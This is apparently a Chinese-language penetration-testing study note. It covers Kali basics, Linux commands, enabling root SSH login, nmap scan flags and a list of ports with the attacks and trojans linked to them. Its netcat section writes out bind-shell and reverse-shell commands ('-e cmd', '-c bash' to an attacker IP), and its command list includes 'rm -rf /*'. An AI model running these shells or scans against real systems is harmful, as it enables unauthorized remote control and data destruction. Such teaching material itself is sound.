# 渗透测试基础04

# 渗透测试系统的了解（kali安装、Linux权限及常用命令、kali配置ssh——然后使用bitvise远程连接、Linux修改更新源、安装beef、kali的nc、nmap、常用端口）

## 入侵类操作系统（kali）

**kali**

基于linux

一般安装方式：

1 通过install安装【但容易被追踪】

2 live光盘启动：iso光盘镜像——live方式启动，一切行为都是在内存里的，断电消失。



## linux权限

kali2020以后
**用户名密码**都是**kali**

kali2019以下
**用户名root 密码toor**

```
$   #普通用户权限

sudo su   #提权命令

\#    #root权限（机器&人类可用最高权限）
```



### 常用工具

分析\后门\逆向等常用工具 kali linux

![image-20220105143538507](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220105143538507.png)



### linux常用命令：

```
sudo su   #提权命令

ifconfig  #查看ip地址

whoami #查看自己是谁，当前用户

pwd  #查看当前所在目录

cd ..  #退一格
（在linux的世界里/是最上层目录）
.    #当前目录下

ls  #查看当前目录

ls -la  #查看详细信息

```

```
关于权限：
d r-x r-x r-x 13 root root 0 Nov 3 11:22 sys
   A   B   C       D    E                 F

d 文件夹
- 文件
l 链接

r=read=4 
w=write=2 
x=execute=1

A=所有者权限
B=所有者所在组权限
C=其他人权限
D=所有人
E=所有人所在的组
F=文件名

rwxr--r-x
745
```

```
mkdir test  #新建文件夹,名字叫test

touch 1.txt  #新建文件1.txt


vi 1.txt   #使用vi编辑东西

#vi是一个命令行编辑器
#按下i进入insert模式
#esc---:wq 保存退出 :q! 不保存退出


cat 1.txt  #看一下1.txt内容
tac 1.txt  #从后往前看一下1.txt内容

cp [被复制的人] [复制的位置]   #复制

mv [被剪切的人] [目标位置]     #剪切/改名

rm [目标]   #删除

rm -rf [目标]   #全部删除并且不询问
（rm -rf /*  #危险命令-删库-强行删除根目录下所有内容）

find [要在哪个地方查找] -name [查找的文件名]   #找东西

ps   #查看进程（任务管理器）
ps -ef   #查看所有进程

top   #看进程（动态进程的任务管理器）

ctrl+c   #结束

ps -ef | grep [条件]  #筛选符合条件关键词的进程
ps -ef | grep bash    #在所有进程里面查看名字叫bash的

# | = 叫管道符,把左边命令执行的结果给右边

echo   #回显，引号用于区分，不会

echo haha > 1.txt     #在1.txt里写入haha（覆盖）
echo haha >> 1.txt    #追加

uname     #查看操作系统
uname -a   #查看详细信息

chmod [权限数字] [目标文件]   #修改权限
chmod 755 -R [文件夹]     #修改文件夹内所有东西的权限

防火墙
service iptables start/stop #开启/关闭防火墙

chkconfig iptables on/off #永久开启/关闭

passwd  #修改密码
```





## kali配置ssh——然后使用bitvise连接

### **配置ssh**：

```
vi /etc/ssh/sshd_config  #修改ssh
```

1 去掉Port 22前的#

![image-20220105150042140](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220105150042140.png)

2 PermitRootLogin去掉前面#并确保yes

![image-20220105150135686](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220105150135686.png)

3 PubKeyAuthentication去掉#并确保yes

![image-20220105150241401](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220105150241401.png)

4 保证GSSAPI这三条前都是#

![image-20220105150331688](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220105150331688.png)

修改完后`:wq`

```
systemctl restart ssh/sshd   #重启ssh（新版）
/etc/init.d/ssh restart      #（旧版）
```

之后使用**bitvise**连接



### **使用bitvise连接**:

输入kali的ip，用户名和密码

![image-20220105150600080](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220105150600080.png)

然后就可以直接通过bitvise远程连接进行实验了。



## linus相关命令操作

### 修改更新源

即——linux下载东西从哪下载

默认下载地址：

```
/etc/apt/sources.list
```

打开文件后将其更新源改为国内，比如阿里的：

（网上搜索kali更新源，复制粘贴下来上传到文件里）

```
deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
```

然后让它自己更新一下：

```
apt-get update   #更新
```



### **安装beef命令**

```
apt-get install beef-xss  #2019版本以后（老版本有）
```





## nc（瑞士军刀）

黑客的最终目标是控制目标电脑的cmd/powershell

黑客的最终目标是控制目标电脑的cmd/powershell

微软觉得cmd权限和可以做的事太少了就弄了一个powershell



**nc（瑞士军刀）**（Windows和linux都可用的一个软件，用于控制目标电脑的cmd/powershell）
开源

**netcat**



### nc的安装：

kali自带，输入nc即可

Windows需要下载，解压后在当前目录下打开命令行，输入nc即可



### nc的使用：

#### 1 **普通发送文字--互相通信**：

服务端（被连接者）：

```
nc -l -p 4444 #监听444端口
```

客户端（连接者）：

```
nc -nv [服务端ip] 4444  #连接服务端的444端口
```



#### 2 **远程控制**：

**正向控制**：
目标：

```
nc -lp 3333 -e cmd   #lp监听3333端口，如果有人连接我的3333端口，就把cmd反传给黑客执行
```

黑客：

```
nc -nv [目标Ip] 3333  #黑客就可以连接目标的cmd
```



**反向控制**：（大多数）
黑客：

```
nc -lp 3333  #监听自己的3333端口
```

目标：

```
nc -nv [黑客ip] 3333 -e cmd   #连接黑客的3333端口并且执行了cmd
```



如果是入侵linux系统，那么需要执行的是bash（等同于Windows的cmd） 

```
-c bash
#等同于 -e cmd
```



## nmap-kali自带软件

nmap全世界最厉害的扫描器：

主机发现
端口扫描
版本侦测
操作系统指纹识别



```
nmap   #可看所有可执行的命令
```



```
nmap [目标ip或目标网段192.168.1.0/24或目标网段192.168.1.1-24]   #普通扫描

-sT    #tcp扫描，普通扫描
nmap -sT [目标ip]

-sS    #隐秘扫描(不形成三次握手)，不建立tcp连接，所以不会在防火墙上留下痕迹

-sL [考虑扫一个网段]   #list scan列表扫描，主要用于主机发现
nmap -sL 192.168.1.1-254

-sn   #ping scan（ping扫描）只发现主机不扫描端口

-Pn   #将所有主机都假定为开机，跳过主机发现过程

-P0    #使用ip协议探测主机是否开启

-sU    #使用udp扫描

-p [指定扫描哪些端口]   

-O    #识别操作系统
```



## bitvise关闭kali的连接

```
shutdown -h now
```


## 常见端口

21/tcp FTP 文件传输协议

22/tcp SSH 安全登录、文件传送(SCP)和端口重定向

23/tcp Telnet 不安全的文本传送

25/tcp SMTP Simple Mail Transfer Protocol (E-mail)

69/udp TFTP Trivial File Transfer Protocol

79/tcp finger Finger

80/tcp HTTP 超文本传送协议 (WWW)

88/tcp Kerberos Authenticating agent

110/tcp POP3 Post Office Protocol (E-mail)

113/tcp ident old identification server system

119/tcp NNTP used for usenet newsgroups

220/tcp IMAP3

443/tcp HTTPS used for securely transferring web pages

端口：0

服务：Reserved

说明：通常用于分析操作系统。这一方法能够工作是因为在一些系统中“0”是无效端口，当你试图使用通常的闭合端口连接它时将产生不同的结果。一种典型的扫描，使用IP地址为0.0.0.0，设置ACK位并在以太网层广播。

端口：1

服务：tcpmux

说明：这显示有人在寻找SGI Irix机器。Irix是实现tcpmux的主要提供者，默认情况下tcpmux在这种系统中被打开。Irix机器在发布是含有几个默认的无密码的帐户，如：IP、GUEST UUCP、NUUCP、DEMOS 、TUTOR、DIAG、OUTOFBOX等。许多管理员在安装后忘记删除这些帐户。因此HACKER在INTERNET上搜索tcpmux并利用这些帐户。

端口：7

服务：Echo

说明：能看到许多人搜索Fraggle放大器时，发送到X.X.X.0和X.X.X.255的信息。

端口：19

服务：Character Generator

说明：这是一种仅仅发送字符的服务。UDP版本将会在收到UDP包后回应含有垃圾字符的包。TCP连接时会发送含有垃圾字符的数据流直到连接关闭。HACKER利用IP欺骗可以发动DoS攻击。伪造两个chargen服务器之间的UDP包。同样Fraggle DoS攻击向目标地址的这个端口广播一个带有伪造受害者IP的数据包，受害者为了回应这些数据而过载。

端口：21

服务：FTP

说明：FTP服务器所开放的端口，用于上传、下载。最常见的攻击者用于寻找打开anonymous的FTP服务器的方法。这些服务器带有可读写的目录。木马Doly Trojan、Fore、Invisible FTP、WebEx、WinCrash和Blade Runner所开放的端口。

端口：22

服务：Ssh

说明：PcAnywhere建立的TCP和这一端口的连接可能是为了寻找ssh。这一服务有许多弱点，如果配置成特定的模式，许多使用RSAREF库的版本就会有不少的漏洞存在。

端口：23

服务：Telnet

说明：远程登录，**者在搜索远程登录UNIX的服务。大多数情况下扫描这一端口是为了找到机器运行的操作系统。还有使用其他技术，**者也会找到密码。木马Tiny Telnet Server就开放这个端口。

端口：25

服务：SMTP

说明：SMTP服务器所开放的端口，用于发送邮件。**者寻找SMTP服务器是为了传递他们的SPAM。**者的帐户被关闭，他们需要连接到高带宽的E-MAIL服务器上，将简单的信息传递到不同的地址。木马Antigen、Email Password Sender、Haebu Coceda、Shtrilitz Stealth、WinPC、WinSpy都开放这个端口。

端口：31

服务：MSG Authentication

说明：木马Master Paradise、Hackers Paradise开放此端口。

端口：42

服务：WINS Replication

说明：WINS复制

端口：53

服务：Domain Name Server（DNS）

说明：DNS服务器所开放的端口，**者可能是试图进行区域传递（TCP），欺骗DNS（UDP）或隐藏其他的通信。因此防火墙常常过滤或记录此端口。

端口：67

服务：Bootstrap Protocol Server

说明：通过DSL和Cable modem的防火墙常会看见大量发送到广播地址255.255.255.255的数据。这些机器在向DHCP服务器请求一个地址。HACKER常进入它们，分配一个地址把自己作为局部路由器而发起大量中间人（man-in-middle）攻击。客户端向68端口广播请求配置，服务器向67端口广播回应请求。这种回应使用广播是因为客户端还不知道可以发送的IP地址。

端口：69

服务：Trival File Transfer

说明：许多服务器与bootp一起提供这项服务，便于从系统下载启动代码。但是它们常常由于错误配置而使**者能从系统中窃取任何 文件。它们也可用于系统写入文件。

端口：79

服务：Finger Server

说明：**者用于获得用户信息，查询操作系统，探测已知的缓冲区溢出错误，回应从自己机器到其他机器Finger扫描。

端口：80

服务：HTTP

说明：用于网页浏览。木马Executor开放此端口。

端口：99

服务：gram Relay

说明：后门程序ncx99开放此端口。

端口：102

服务：Message transfer agent(MTA)-X.400 over TCP/IP

说明：消息传输代理。

端口：109

服务：Post Office Protocol -Version3

说明：POP3服务器开放此端口，用于接收邮件，客户端访问服务器端的邮件服务。POP3服务有许多公认的弱点。关于用户名和密码交 换缓冲区溢出的弱点至少有20个，这意味着**者可以在真正登陆前进入系统。成功登陆后还有其他缓冲区溢出错误。

端口：110

服务：SUN公司的RPC服务所有端口

说明：常见RPC服务有rpc.mountd、NFS、rpc.statd、rpc.csmd、rpc.ttybd、amd等

端口：113

服务：Authentication Service

说明：这是一个许多计算机上运行的协议，用于鉴别TCP连接的用户。使用标准的这种服务可以获得许多计算机的信息。但是它可作为许多服务的记录器，尤其是FTP、POP、IMAP、SMTP和IRC等服务。通常如果有许多客户通过防火墙访问这些服务，将会看到许多这个端口的连接请求。记住，如果阻断这个端口客户端会感觉到在防火墙另一边与E-MAIL服务器的缓慢连接。许多防火墙支持TCP连接的阻断过程中发回RST。这将会停止缓慢的连接。

端口：119

服务：Network News Transfer Protocol

说明：NEWS新闻组传输协议，承载USENET通信。这个端口的连接通常是人们在寻找USENET服务器。多数ISP限制，只有他们的客户才能访问他们的新闻组服务器。打开新闻组服务器将允许发/读任何人的帖子，访问被限制的新闻组服务器，匿名发帖或发送SPAM。

端口：135

服务：Location Service

说明：Microsoft在这个端口运行DCE RPC end-point mapper为它的DCOM服务。这与UNIX 111端口的功能很相似。使用DCOM和RPC的服务利用计算机上的end-point mapper注册它们的位置。远端客户连接到计算机时，它们查找end-point mapper找到服务的位置。HACKER扫描计算机的这个端口是为了找到这个计算机上运行Exchange Server吗？什么版本？还有些DOS攻击直接针对这个端口。

端口：137、138、139

服务：NETBIOS Name Service

说明：其中137、138是UDP端口，当通过网上邻居传输文件时用这个端口。而139端口：通过这个端口进入的连接试图获得NetBIOS/SMB服务。这个协议被用于windows文件和打印机共享和SAMBA。还有WINS Regisrtation也用它。

端口：143

服务：Interim Mail Access Protocol v2

说明：和POP3的安全问题一样，许多IMAP服务器存在有缓冲区溢出漏洞。记住：一种LINUX蠕虫（admv0rm）会通过这个端口繁殖，因此许多这个端口的扫描来自不知情的已经被感染的用户。当REDHAT在他们的LINUX发布版本中默认允许IMAP后，这些漏洞变的很流行。这一端口还被用于IMAP2，但并不流行。

端口：161

服务：SNMP

说明：SNMP允许远程管理设备。所有配置和运行信息的储存在数据库中，通过SNMP可获得这些信息。许多管理员的错误配置将被暴露在Internet。Cackers将试图使用默认的密码public、private访问系统。他们可能会试验所有可能的组合。SNMP包可能会被错误的指向用户的网络。

端口：177

服务：X Display Manager Control Protocol

说明：许多**者通过它访问X-windows操作台，它同时需要打开6000端口。

端口：389

服务：LDAP、ILS

说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。

端口：443

服务：Https

说明：网页浏览端口，能提供加密和通过安全端口传输的另一种HTTP。

端口：456

服务：[NULL]

说明：木马HACKERS PARADISE开放此端口。

端口：513

服务：Login,remote login

说明：是从使用cable modem或DSL登陆到子网中的UNIX计算机发出的广播。这些人为**者进入他们的系统提供了信息。

端口：544

服务：[NULL]

说明：kerberos kshell

端口：548

服务：Macintosh,File Services(AFP/IP)

说明：Macintosh,文件服务。

端口：553

服务：CORBA IIOP （UDP）

说明：使用cable modem、DSL或VLAN将会看到这个端口的广播。CORBA是一种面向对象的RPC系统。**者可以利用这些信息进入系统。

端口：555

服务：DSF

说明：木马PhAse1.0、Stealth Spy、IniKiller开放此端口。

端口：568

服务：Membership DPA

说明：成员资格 DPA。

端口：569

服务：Membership MSN

说明：成员资格 MSN。

端口：635

服务：mountd

说明：Linux的mountd Bug。这是扫描的一个流行BUG。大多数对这个端口的扫描是基于UDP的，但是基于TCP的mountd有所增加（mountd同时运行于两个端口）。记住mountd可运行于任何端口（到底是哪个端口，需要在端口111做portmap查询），只是Linux默认端口是635，就像NFS通常运行于2049端口。

端口：636

服务：LDAP

说明：SSL（Secure Sockets layer）

端口：666

服务：Doom Id Software

说明：木马Attack FTP、Satanz Backdoor开放此端口

端口：993

服务：IMAP

说明：SSL（Secure Sockets layer）

端口：1001、1011

服务：[NULL]

说明：木马Silencer、WebEx开放1001端口。木马Doly Trojan开放1011端口。


